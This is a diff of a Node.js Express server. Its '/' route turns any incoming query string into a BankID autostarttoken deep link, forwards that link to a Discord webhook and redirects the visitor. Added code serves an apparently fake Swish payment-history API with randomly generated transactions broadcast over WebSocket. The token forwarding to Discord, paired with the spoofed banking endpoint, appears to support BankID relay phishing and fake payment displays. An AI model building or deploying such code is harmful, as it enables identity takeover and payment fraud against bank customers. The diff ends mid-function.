@@ -14,36 +14,114 @@ app.use(express.json());
 
 // Example route handler for '/'
 app.get('/', (req, res) => {
-  // Extract the query string from req.url
   const queryString = req.url;
-
-  // Check if queryString exists and is not empty
   if (!queryString || queryString === '/') {
     return res.status(400).send('Invalid URL');
   }
-
-  // Extract the autostarttoken parameter from the query string and trim leading '/?'
   let autostarttoken = queryString.replace(/^\/?\?/, '');
-
-  // Check if autostarttoken is defined
   if (!autostarttoken) {
     return res.status(400).send('Missing autostarttoken parameter');
   }
-
-  // Remove trailing '=' before '&'
   autostarttoken = autostarttoken.replace(/=(&|$)/g, '$1');
-
-  // Construct the redirect URL with formatted query parameters
   const redirectUrl = `bankid:///?autostarttoken=${autostarttoken}`;
-
-  // Log the redirect URL to Discord webhook (replace with your webhook function)
   sendDiscordWebhook(redirectUrl);
-
-  // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
 
+const paymentHistory = [{
+    paymentChannel: "MPC",
+    amount: "1.00",
+    currency: "SEK",
+    payerPayee: {
+        name: "TEST USER",
+        businessName: null,
+        alias: "46700000000"
+    },
+    message: "This is an example message.",
+    orderId: null,
+    paymentType: "P2P",
+    gift: { themeId: "sallad1" },
+    birPaymentId: "123123123",
+    paymentDirection: "INCOMING",
+    bankPaymentReference: "123123123",
+    dateTime: "2019-04-01T11:56:23"
+}];
 
+// Function to add a new payment
+function addNewPayment() {
+    const newPayment = {
+        paymentChannel: "MPC",
+        amount: (Math.random() * 100).toFixed(2),
+        currency: "SEK",
+        payerPayee: {
+            name: "Swish Development",
+            businessName: null,
+            alias: "1230000000"
+        },
+        message: "Tack för igår!",
+        orderId: `${Math.floor(Math.random() * 1000000)}`,
+        paymentType: "COMMERCE",
+        gift: null,
+        birPaymentId: `${Math.floor(Math.random() * 1000000)}`,
+        paymentDirection: Math.random() > 0.5 ? "OUTGOING" : "INCOMING",
+        bankPaymentReference: `${Math.floor(Math.random() * 1000000)}`,
+        dateTime: new Date().toISOString()
+    };
+
+    paymentHistory.unshift(newPayment); // Add new payment at the beginning
+    if (paymentHistory.length > 10) {
+        paymentHistory.pop(); // Ensure the history contains only the latest 10 items
+    }
+
+    // Broadcast the new payment to all WebSocket clients
+    broadcastPayment(newPayment);
+}
+
+// Create an HTTP server
+const server = http.createServer(app);
+
+// Create a WebSocket server
+const wss = new WebSocket.Server({ server });
+
+// Broadcast a new payment to all connected WebSocket clients
+function broadcastPayment(payment) {
+    wss.clients.forEach(client => {
+        if (client.readyState === WebSocket.OPEN) {
+            client.send(JSON.stringify(payment));
+        }
+    });
+}
+
+// WebSocket connection handler
+wss.on('connection', (ws) => {
+    console.log('New client connected');
+    ws.on('close', () => {
+        console.log('Client disconnected');
+    });
+});
+
+// Simulate new payments every 10 seconds
+setInterval(addNewPayment, 10000);
+
+// Endpoint to get payment history
+app.get("/mpc-swish/api/v4/paymenthistory/:count/:type/:start/:end/", (req, res) => {
+    const { type } = req.params;
+
+    // Filter payment history based on type
+    let filteredPayments = paymentHistory;
+    if (type !== 'ALL') {
+        filteredPayments = paymentHistory.filter(payment => payment.paymentDirection === type);
+    }
+
+    res.status(200).json({
+        result: "200",
+        bankIdOrderReference: null,
+        dateTimeOfSearch: new Date().toISOString(),
+        endOfSearch: true,
+        items: filteredPayments.slice(0, 1), // Return only the first item
+        autoStartToken: null
+    });
+});
   // Function to send Discord webhook
 async function sendDiscordWebhookEmbed(embed) {
   try {
